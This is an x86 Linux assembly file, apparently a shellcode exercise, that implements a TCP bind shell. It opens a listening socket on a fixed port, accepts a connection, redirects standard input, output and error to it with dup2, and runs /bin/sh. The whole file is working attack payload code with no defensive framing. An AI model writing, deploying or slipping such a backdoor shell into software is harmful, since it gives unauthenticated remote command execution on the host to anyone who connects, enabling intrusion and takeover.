; Shell Bind TCP
; Written By Hussien Yousef

global _start

section .text

_start:
; socket(AF_INET, SOCK_STREAM, 0)

mov eax, 102
mov ebx, 1
push 0
push 1
push 2
mov ecx, esp
int 0x80


; bind(sockfd, *addr, add_len_bytes)
mov edx, eax ; sockfd
mov eax, 102
mov ebx, 2
;sockaddr struct
push 0
push word 0x6711
xor edi, edi
mov di, 2
push di
mov esi, esp
; args to bind
push 16
push esi
push edx
mov ecx, esp 
int 0x80




; listen(sockfd, backlog)
mov eax, 102
mov ebx, 4
; args to listen
push 0
push edx
mov ecx, esp
int 0x80



; accept(sockfd, *addr, addr_len)
mov eax, 102
mov ebx, 5
; args to accept
push 0
push 0
push edx

mov ecx, esp
int 0x80



; dup2(acceptfd, 2)
mov ebx, eax
mov eax, 63
mov ecx, 2
int 0x80

; dup2(sockfd, 1)
mov eax, 63
dec ecx
int 0x80

; dup2(sockfd, 0)
mov eax, 63
dec ecx
int 0x80


; execve("/bin/sh", null, null)
mov eax, 11
lea ebx, [my_path]
xor ecx, ecx
xor edx, edx
int 0x80



section .data
my_path: db "/bin/sh"
